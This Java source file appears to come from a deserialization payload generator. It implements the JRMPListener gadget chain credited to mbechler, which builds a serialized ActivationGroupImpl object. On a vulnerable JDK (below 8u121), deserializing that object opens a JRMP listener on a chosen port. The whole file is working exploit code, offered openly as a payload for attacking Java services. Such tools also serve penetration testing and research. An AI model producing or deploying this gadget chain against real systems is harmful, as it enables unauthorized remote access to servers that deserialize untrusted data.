package com.ppp.chain.jrmp;

import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;

import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

/**
 * @author Whoopsunix
 */
@Authors({Authors.MBECHLER})
@Dependencies("JDK:<8u121")
@Sink({Sink.JNDI})
public class JRMPListener implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(JRMPListener.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setPort(1099);
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        PayloadRunner.run(JRMPListener.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Integer port = sinksHelper.getPort();

        Object kickOffObject = getChain(port);

        return kickOffObject;
    }

    public Object getChain(int port) throws Exception {
        UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[]{
                RemoteRef.class
        }, new Object[]{
                new UnicastServerRef(port)
        });

        Reflections.getField(UnicastRemoteObject.class, "port").set(uro, port);
        return uro;
    }
}
